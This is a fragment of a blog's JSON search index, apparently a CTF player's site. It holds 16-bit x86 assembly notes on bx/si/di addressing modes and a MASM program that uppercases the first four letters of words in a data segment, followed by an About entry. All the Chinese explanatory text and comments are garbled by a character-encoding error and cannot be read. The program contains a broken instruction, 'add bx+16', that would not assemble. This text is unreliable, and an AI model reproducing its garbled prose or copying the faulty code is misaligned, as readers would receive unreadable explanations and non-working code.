egï¼š[5+bx],[0+bx]åˆ†åˆ«è¡¨ç¤ºä»dsï¼š5å’Œdsï¼š0å¼€å§‹çš„ä¸¤ä¸ªæ•°ç»„ [0+bx]=[bx+0]=0[bx]=[bx].0 ","date":"2020-10-01","objectID":"/assembly-1/:7:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2bxidataä¸æ•°ç»„"},{"categories":["Pwning"],"content":"3ã€SIå’ŒDISI,DIä¸bxåŠŸèƒ½ç›¸è¿‘ï¼Œä½†ä¸èƒ½åˆ†æˆä¸¤ä¸ªå…«ä½å¯„å­˜å™¨ã€‚ mov ax,[bx+si] ;ä¹Ÿå¯ä»¥å†™æˆè¿™ç§å½¢å¼ mov ax,[bx][si] ;å¯¹äº[bx+si+idata]æœ‰ä»¥ä¸‹å‡ ç§å½¢å¼ mov ax,[bx+200+si] mov ax,[200+bx+si] mov ax,200[bx][si] mov ax,[bx].200[si] mov ax,[bx][si].200 ","date":"2020-10-01","objectID":"/assembly-1/:7:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3siå’Œdi"},{"categories":["Pwning"],"content":"4ã€äºŒé‡å¾ªç¯ä¸æ ˆçš„åº”ç”¨ ;ä¸‹åˆ—ç¨‹åºå¯ä»¥å®ç°æ•°æ®æ®µçš„æ¯ä¸ªå•è¯çš„å‰å››ä¸ªå­—æ¯å˜ä¸ºå¤§å†™ assume cs:codesg,ss:stacksg,ds:datasg datasg segment ;æ•°æ®æ®µ db '1. display ' db '2. brows ' db '3. replace ' db '4. modify ' datasg ends stacksg segment ;æ ˆæ®µï¼Œæ³¨æ„æ ˆé¡¶sp dw 0,0,0,0,0,0,0,0 stacksg ends codesg segment start: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov cx,4 ;å¤–å¾ªç¯æ¬¡æ•° mov bx,0 ;ç”¨bxä»£è¡¨è¡Œ s0: push cx ;å¤–å±‚å¾ªç¯æ•°æš‚å­˜å…¥cx mov si,0 ;siä»£è¡¨åˆ— mov cx,4 ;å†…å¾ªç¯æ•° s: mov al,ds:[bx+3+si] ;å¾ªç¯å®ç°å‰å››ä¸ªå­—æ¯å˜ä¸ºå¤§å†™ and al,11011111B mov ds:[bx+3+si],al inc si ;ç§»åŠ¨åˆ— loop s pop cx ;å‡ºæ ˆï¼Œå–å‡ºå¤–å¾ªç¯cx add bx+16 ;ç§»åŠ¨è¡Œ loop s0 mov ax,4c00H int 21H codesg ends end start ","date":"2020-10-01","objectID":"/assembly-1/:7:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4äºŒé‡å¾ªç¯ä¸æ ˆçš„åº”ç”¨"},{"categories":null,"content":"CTFer \u0026 PWNer Play CTF with r3kapigï¼ 2021.06-2021.09 : venustech-ADLab Windows Security Researcher A student in XXX QQï¼šHA4TGNJQG4ZTCNA= Linksï¼š Kirin: Master of Pwn (Maybe) Sakura: Chrome Fucker (Genius) ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"About","uri":"/about/#"}]